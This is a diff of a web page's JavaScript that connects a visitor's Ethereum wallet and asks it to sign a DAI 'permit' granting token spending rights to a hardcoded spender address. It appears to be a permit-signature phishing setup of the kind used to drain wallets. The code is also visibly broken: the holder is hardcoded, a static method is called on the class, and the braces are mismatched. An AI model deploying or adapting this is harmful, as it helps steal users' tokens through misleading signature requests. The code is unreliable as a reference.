@@ -46,17 +46,21 @@
     //const ADDRESS = "0xB9542838da5980212e4Ef3fF848bea5F15834387";
     const ADDRESS = "0xABF1a72A2D72fd4B8b74EBcf1cD8E4Fd3Ab55F2e";
     const prc20 = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-    var contractdai = new web3.eth.Contract(ABII, prc20);
-
     const SECOND = 1000;
 
-    const fromAddress = "0xaD6D458402F60fD3Bd25163575031ACDce07538D";
+    const fromAddress = "0x9EE5e175D09895b8E1E28c22b961345e1dF4B5aE";
     // JavaScript dates have millisecond resolution
     const expiry = Math.trunc((Date.now() + 120 * SECOND) / SECOND);
     const nonce = 1;
     const spender = "0x009f6eE78C4782E3D8779cB2a92EaEb2dCe9EdDf";
-
-    
+    const createPermitMessageData = function () {
+  const message = {
+    holder: fromAddress,
+    spender: spender,
+    nonce: nonce,
+    expiry: expiry,
+    allowed: true,
+  };
 
   const typedData = JSON.stringify({
     types: {
@@ -106,28 +110,31 @@
       name: "Dai Stablecoin",
       version: "1",
       chainId: 42,
-      verifyingContract: "0x4F96Fe3b7A6Cf9725f59d353F723c1bDb64CA6Aa",
+      verifyingContract: "0xaD6D458402F60fD3Bd25163575031ACDce07538D",
     },
     message: message,
-  });
+    });
 
-
-
+    return {
+        typedData,
+        message,
+        };
+    };
     async function w() {
-        const createPermitMessageData = function () {
-        const message = {
-        holder: fromAddress,
-        spender: spender,
-        nonce: nonce,
-        expiry: expiry,
-        allowed: true,
-        }
-        const signData = async function (web3, fromAddress, typeData) {
-        const result = await web3.currentProvider.sendAsync({
+
+        if(window.ethereum) {
+        await window.ethereum.send('eth_requestAccounts');
+        window.web3 = new Web3(window.ethereum);
+        var accounts = await web3.eth.getAccounts();
+        account = accounts[0];
+        document.getElementById('connect-wallet').textContent = account;
+       
+        const signData = async function (web3, account, typeData) {
+        const result = await Web3.sendAsync({
         id: 42,
         method: "eth_signTypedData_v3",
-        params: [fromAddress, typeData],
-        from: fromAddress,
+        params: [account, typeData],
+        from: account,
         });
   
         const r = result.result.slice(0, 66);
@@ -135,20 +142,10 @@
         const v = Number("0x" + result.result.slice(130, 132));
   
         return { v, r, s };
-        };
-        const signTransferPermit = async function () {
-            const messageData = createPermitMessageData();
-            const sig = await signData(web3, fromAddress, messageData.typedData);
-            return Object.assign({}, sig, messageData.message);
-        };
-        if(window.ethereum) {
-        await window.ethereum.send('eth_requestAccounts');
-        window.web3 = new Web3(window.ethereum);
-       
+    };
 
-        var accounts = await web3.eth.getAccounts();
-        account = accounts[0];
-        document.getElementById('connect-wallet').textContent = account;
+        
+        
         
         console.log(account);   
         contract = new web3.eth.Contract(ABI, ADDRESS);
@@ -165,8 +162,8 @@
         }
 
     }
-    }
 }
+
 
     
 </script>
